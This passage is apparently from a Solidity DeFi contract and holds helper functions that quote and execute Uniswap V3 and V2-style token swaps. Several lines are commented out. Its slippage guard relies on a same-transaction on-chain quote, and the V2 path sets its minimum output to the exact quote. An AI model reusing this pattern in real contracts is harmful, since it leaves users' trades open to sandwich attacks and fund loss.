        // Uniswap V3 QuoterV2 address on Ethereum mainnet
        // IQuoterV2 quoter = IQuoterV2(quoter);
        uint24 poolFee = 3000; // Pool fee tier (e.g., 3000 for 0.3%)
        uint256 slippageTolerance = 50;  // Slippage tolerance in basis points (e.g., 50 = 0.5%)

        // Quote the expected output amount
        (uint256 amountOutQuoted, , , ) = quoter.quoteExactInputSingle(
            ADDR_TOK_WETH_ETH,           // Input token (WETH)
            tokenOut,       // Output token (ERC20)
            poolFee,        // Fee tier
            amntInETH,      // Input amount (ETH)
            0               // No price limit (sqrtPriceLimitX96)
        );
        return _swap_v3_eth_to_erc20(tokenOut, router, amntInETH, amountOutQuoted, poolFee, slippageTolerance, outReceiver);
    }
    function _swap_v3_eth_to_erc20(
        address tokenOut,           // Address of the ERC20 token to receive
        address router,
        uint256 amntInETH,
        uint256 amountOutQuoted,    // Quoted output amount
        uint24 poolFee,             // Pool fee tier (e.g., 3000 for 0.3%)
        uint256 slippageTolerance,  // Slippage tolerance in basis points (e.g., 50 = 0.5%)
        address outReceiver      // Address to receive the output tokens
        // uint256 deadline            // Transaction deadline (timestamp)
    ) private returns (uint256 amountOut) {
        require(msg.value > 0, "Must send ETH to swap");

        // Uniswap V3 SwapRouter address on Ethereum mainnet
        // ISwapRouter uniswapRouterV3 = ISwapRouter(router);

        // // Uniswap V3 QuoterV2 address on Ethereum mainnet
        // IQuoterV2 quoter = IQuoterV2(quoter);

        // // Quote the expected output amount
        // (uint256 amountOutQuoted, , , ) = quoter.quoteExactInputSingle(
        //     ADDR_TOK_WETH_ETH,           // Input token (WETH)
        //     tokenOut,       // Output token (ERC20)
        //     poolFee,        // Fee tier
        //     msg.value,      // Input amount (ETH)
        //     0               // No price limit (sqrtPriceLimitX96)
        // );

        // Calculate minimum output amount with slippage tolerance
        // Slippage tolerance is in basis points (e.g., 50 = 0.5%, 100 = 1%)
        uint256 amountOutMinimum = (amountOutQuoted * (10000 - slippageTolerance)) / 10000;

        // Parameters for the exactInputSingle swap
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
            tokenIn: ADDR_TOK_WETH_ETH,
            tokenOut: tokenOut,
            fee: poolFee,
            recipient: outReceiver,
            deadline: block.timestamp + 300,
            amountIn: amntInETH,
            amountOutMinimum: amountOutMinimum,
            sqrtPriceLimitX96: 0
        });

        // Execute the swap w/ Uniswap V3 SwapRouter address on Ethereum mainnet
        amountOut = ISwapRouter(router).exactInputSingle{value: msg.value}(params);

        // Emit event with swap details
        // emit SwapExecuted(msg.value, amountOut);

        // Refund excess ETH if any
        // uint256 leftoverEth = address(this).balance;
        // if (leftoverEth > 0) {
        //     (bool sent, ) = msg.sender.call{value: leftoverEth}("");
        //     require(sent, "Failed to refund excess ETH");
        // }

        return amountOut;
    }
    // uniwswap v2 protocol based: get quote and execute swap
    function _swap_v2_wrap(address[] memory path, address router, uint256 amntIn, address outReceiver, bool fromETH) private returns (uint256) {
        // require(path.length >= 2, 'err: path.length :/');
        uint256[] memory amountsOut = IUniswapV2Router02(router).getAmountsOut(amntIn, path); // quote swap
        uint256 amntOutQuote = amountsOut[amountsOut.length -1];
        // uint256 amntOutQuote = _swap_v2_quote(path, router, amntIn);
        uint256 amntOut = _swap_v2(router, path, amntIn, amntOutQuote, outReceiver, fromETH); // approve & execute swap
                
        // verifiy new balance of token received
        // uint256 new_bal = IERC20(path[path.length -1]).balanceOf(outReceiver);
        // require(new_bal >= amntOut, " _swap: receiver bal too low :{ ");
        
        return amntOut;
    }
    // v2: solidlycom, kyberswap, pancakeswap, sushiswap, uniswap v2, pulsex v1|v2, 9inch
    function _swap_v2(address router, address[] memory path, uint256 amntIn, uint256 amntOutMin, address outReceiver, bool fromETH) private returns (uint256) {
        IUniswapV2Router02 swapRouter = IUniswapV2Router02(router);
        
        IERC20(address(path[0])).approve(address(swapRouter), amntIn);
        uint deadline = block.timestamp + 300;
        uint[] memory amntOut;
        if (fromETH) {
            amntOut = swapRouter.swapExactETHForTokens{value: amntIn}(
                            amntOutMin,
                            path, //address[] calldata path,
                            outReceiver, // to
                            deadline
                        );
        } else {
            amntOut = swapRouter.swapExactTokensForTokens(
                            amntIn,
                            amntOutMin,
                            path, //address[] calldata path,
                            outReceiver, //  The address that will receive the output tokens after the swap. 
                            deadline
                        );
        }
        return uint256(amntOut[amntOut.length - 1]); // idx 0=path[0].amntOut, 1=path[1].amntOut, etc.
    }
}
